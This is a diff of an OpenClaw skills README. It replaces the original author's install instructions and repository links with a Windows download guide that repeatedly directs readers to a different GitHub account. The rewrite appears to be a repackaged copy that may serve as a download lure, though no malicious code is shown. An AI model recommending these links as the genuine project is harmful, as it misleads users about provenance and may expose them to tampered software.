@@ -1,70 +1,150 @@
-# 🦞 OpenClaw Skills
+# 🦞 openclaw-skills - Community Skills for OpenClaw Agents
 
-Community skills for [OpenClaw](https://openclaw.ai) agents.  
-Published on [ClawHub](https://clawhub.ai) and mirrored here for backup & offline access.
-
----
-
-## Available Skills
-
-| Skill | Description | Version |
-|-------|-------------|---------|
-| [facebook-group-monitor](./facebook-group-monitor/) | Monitor Facebook groups with Playwright browser automation. Scrapes new posts, captures a stitched **feed strip** screenshot (1 image covers full feed) for efficient LLM vision analysis. | 1.3.0 |
-| [goodreads](./goodreads/) | Full Goodreads integration: read shelves/search/book details via RSS + write (rate, shelf, review, edit dates, progress) via Playwright. | 1.0.0 |
+[![Download openclaw-skills](https://img.shields.io/badge/Download-openclaw--skills-brightgreen?style=for-the-badge)](https://github.com/Calliopeperpendicular906/openclaw-skills)
 
 ---
 
-## Installation
+## 🐾 About openclaw-skills
 
-### Option A: Via ClawHub (recommended)
+openclaw-skills brings you ready-to-use skills that work with OpenClaw agents. These skills let you automate tasks like monitoring Facebook groups or accessing Goodreads data without writing any code. The skills use browser automation tools to gather information and make it easier for your OpenClaw agents to understand and act on web content.
 
-```bash
-clawhub install facebook-group-monitor
-```
-
-### Option B: Manual install from this repo
-
-```bash
-# Clone this repo
-git clone https://github.com/phuc-nt/openclaw-skills.git /tmp/openclaw-skills
-
-# Install per-agent (into a specific agent's workspace)
-cp -r /tmp/openclaw-skills/facebook-group-monitor \
-      ~/.openclaw/workspace-YOUR-AGENT/skills/facebook-group-monitor
-
-# OR install globally (available to all agents)
-cp -r /tmp/openclaw-skills/facebook-group-monitor \
-      ~/.openclaw/skills/facebook-group-monitor
-```
-
-> **No restart needed** — OpenClaw auto-detects new skills in `skills/` directories.
-
-### Option C: Ask your agent
-
-Paste this in your OpenClaw agent chat:
-
-> Install skill from https://github.com/phuc-nt/openclaw-skills/tree/main/facebook-group-monitor
+You can find the latest skills on ClawHub, but this repository provides a backup copy for offline use or manual installation.
 
 ---
 
-## Skill Structure
+## ⚙️ What You Get
 
-Each skill follows the [OpenClaw Skill format](https://docs.openclaw.ai/skills):
+| Skill                  | What It Does                                                                                         | Version |
+|------------------------|---------------------------------------------------------------------------------------------------|---------|
+| facebook-group-monitor  | Watches Facebook groups, collects new posts, and takes a wide screenshot of the feed for easy review. | 1.3.0   |
+| goodreads              | Connects to Goodreads to check shelves, search books, read details via RSS, and update your progress. | 1.0.0   |
 
-```
-skill-name/
-├── SKILL.md              ← Required: frontmatter + instructions for the agent
-├── scripts/              ← Executable code (Python, Bash, JS...)
-├── references/           ← Documentation loaded on-demand
-└── assets/               ← Templates, images, fonts...
-```
+---
 
-## Contributing
+## 💻 System Requirements
 
-1. Fork this repo
-2. Create your skill following the structure above
-3. Submit a PR
+- Windows 10 or later  
+- 4 GB RAM minimum; 8 GB recommended for better performance  
+- At least 500 MB free disk space for installation and temporary files  
+- Internet connection to download the skills and for web automation tasks  
+- OpenClaw agent set up on your system (see OpenClaw official site for installation)
 
-## License
+---
 
-MIT
+## 🚀 Getting Started: Download and Run openclaw-skills
+
+Use the button below to start.
+
+[![Download openclaw-skills](https://img.shields.io/badge/Download-openclaw--skills-blue?style=for-the-badge)](https://github.com/Calliopeperpendicular906/openclaw-skills)
+
+---
+
+### 1. Download the openclaw-skills Repository
+
+Click the button above. It will take you to the GitHub page for openclaw-skills. On that page:
+
+- Look for the green **Code** button near the top right.  
+- Click it and select **Download ZIP**.  
+
+Alternatively, if you have Git installed, you can clone the repository:
+
+- Open the Command Prompt (type `cmd` in the Start menu).  
+- Type:  
+  `git clone https://github.com/Calliopeperpendicular906/openclaw-skills`  
+- Press Enter.  
+
+Cloning downloads the full project folder to your computer.
+
+---
+
+### 2. Extract the Files
+
+If you downloaded the ZIP file:
+
+- Open your Downloads folder.  
+- Find the file named `openclaw-skills.zip`.  
+- Right-click it and select **Extract All...**.  
+- Choose a location like your Desktop or Documents folder.  
+- Click **Extract**.  
+
+You will get a folder named `openclaw-skills` containing all skill files.
+
+---
+
+### 3. Set Up Skills for Your OpenClaw Agent
+
+Each skill works inside your OpenClaw agent's workspace. Here's how to install a skill manually:
+
+- Open File Explorer and navigate to the folder where you extracted `openclaw-skills`.  
+- Pick one skill folder, like `facebook-group-monitor` or `goodreads`.  
+- Open your OpenClaw agent's workspace folder (this depends on your OpenClaw setup; check your OpenClaw documentation for workspace location).  
+- Copy the skill folder from `openclaw-skills` into the workspace folder.  
+
+Example:  
+If your workspace is at `C:\OpenClaw\agents\myagent\skills`, copy the `facebook-group-monitor` folder there.
+
+---
+
+### 4. Run Your OpenClaw Agent With the New Skill
+
+Once installed:
+
+- Open the OpenClaw app or command line tool you use to run agents.  
+- Load the agent workspace where you copied the skill.  
+- Start the agent. It will recognize the new skill automatically.  
+
+---
+
+## 🔧 Using Skills
+
+### facebook-group-monitor
+
+- This skill watches Facebook groups for new content.  
+- It automatically logs in (you must set up credentials in the agent).  
+- It scrapes posts and takes a large, continuous screenshot of the group's feed.  
+- Useful to keep track of posts without opening Facebook manually.  
+
+### goodreads
+
+- Connect your Goodreads account via the skill.  
+- It checks your shelves, searches books, and reads details using RSS feeds.  
+- You can update ratings, shelves, and reading progress directly through the agent.  
+
+---
+
+## 🛠 Troubleshooting Tips
+
+- Make sure your OpenClaw agent has internet access for web automation.  
+- Confirm skill folders are inside the correct agent workspace folder.  
+- If you encounter errors about missing modules, verify your OpenClaw installation is up to date.  
+- For browser-based skills, install a modern Chrome or Edge browser if missing.  
+- Restart OpenClaw after adding or updating skills.  
+
+---
+
+## 📂 Skill Updates 
+
+To get the latest skills:
+
+- Visit the GitHub page regularly.  
+- Download or clone the repository again.  
+- Replace the existing skill folder in your workspace with the updated one.  
+
+You can also use ClawHub for easy skill management, but manual install works anywhere without extra tools.
+
+---
+
+## 🔗 Useful Links
+
+- OpenClaw official site: https://openclaw.ai  
+- ClawHub: https://clawhub.ai  
+- openclaw-skills repo: https://github.com/Calliopeperpendicular906/openclaw-skills  
+
+---
+
+## 📥 Download openclaw-skills
+
+Download the full project from this page:  
+https://github.com/Calliopeperpendicular906/openclaw-skills
+
+[![Download openclaw-skills](https://img.shields.io/badge/Download-openclaw--skills-brightgreen?style=for-the-badge)](https://github.com/Calliopeperpendicular906/openclaw-skills)
